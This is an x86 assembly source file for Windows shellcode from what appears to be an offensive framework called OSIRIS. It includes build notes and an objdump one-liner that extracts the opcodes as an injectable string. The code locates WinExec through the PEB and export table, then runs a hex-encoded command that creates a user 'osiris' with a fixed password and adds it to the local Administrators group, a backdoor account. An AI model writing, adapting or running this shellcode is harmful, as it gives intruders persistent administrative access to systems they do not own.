;Template: for creating users using the PEB method
;Author: Samir sanchez garnica
;@sasaga92
;compile: using fasm (nasm file.asm)
;extract opcodes: objdump -d ./file.exe|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g' 
;project: OSIRIS-FRAMEWORK

format PE console
use32
xor    edx,edx
mov    dl,0x30
mov    edx,[fs:edx]
mov    edx,DWORD [edx+0xc]
mov    edx,DWORD [edx+0x1c]
_name_uno:
        mov    eax,DWORD  [edx+0x8]
        mov    esi,DWORD [edx+0x20]
        mov    edx,DWORD [edx]
        cmp    BYTE [esi+0xc],0x33
        jne     _name_uno
        mov    edi,eax
        add    edi,DWORD  [eax+0x3c]
        mov    edx,DWORD [edi+0x78]
        add    edx,eax
        mov    edi,DWORD [edx+0x20]
        add    edi,eax
        xor    ebp,ebp
_name_dos:
        mov    esi,DWORD [edi+ebp*4]
        add    esi,eax
        inc    ebp
        cmp    DWORD [esi],0x456e6957
        jne     _name_dos
        mov    edi,DWORD [edx+0x24]
        add    edi,eax
        mov    bp,WORD  [edi+ebp*2]
        mov    edi,DWORD [edx+0x1c]
        add    edi,eax
        mov    edi,DWORD [edi+ebp*4-0x4]
        add    edi,eax
        xor    ebx,ebx
        push   ebx
   
    push 20646461h
    push 2f207369h
    push 7269736fh
    push 2073726fh
    push 74617274h
    push 73696e69h
    push 6d644120h
    push 70756f72h
    push 676c6163h
    push 6f6c2074h
    push 656e2026h
    push 26202e35h
    push 74347233h
    push 65327731h
    push 51207369h
    push 7269736fh
    push 20726573h
    push 75207465h
    push 6e20632fh
    push 20657865h
    push 2e646d63h
    mov    ebp,esp
    xor    eax,eax
    push   eax
    push   ebp
    call   edi
